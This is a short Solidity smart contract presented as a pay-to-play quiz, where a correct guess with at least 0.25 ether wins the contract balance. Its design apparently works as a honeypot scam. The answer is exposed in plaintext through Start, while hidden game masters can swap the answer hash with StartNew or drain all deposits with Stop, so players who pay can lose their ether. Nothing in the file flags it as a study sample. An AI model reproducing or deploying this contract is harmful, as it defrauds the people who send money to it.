pragma solidity ^0.4.24;

contract Game
{
    string public question;
    bytes32 responseHash;
    mapping(bytes32 => bool) gameMaster;

    function Guess(string _response) external payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value >= 0.25 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }

    function Start(string _question, string _response) public payable onlyGameMaster {
        if(responseHash==0x0){
            responseHash = keccak256(_response);
            question = _question;
        }
    }

    function Stop() public payable onlyGameMaster {
        msg.sender.transfer(this.balance);
    }

    function StartNew(string _question, bytes32 _responseHash) public payable onlyGameMaster {
        question = _question;
        responseHash = _responseHash;
    }

    constructor(bytes32[] _gameMasters) public{
        for(uint256 i=0; i< _gameMasters.length; i++){
            gameMaster[_gameMasters[i]] = true;        
        }       
    }

    modifier onlyGameMaster(){
        require(gameMaster[keccak256(msg.sender)]);
        _;
    }

    function() public payable{}
}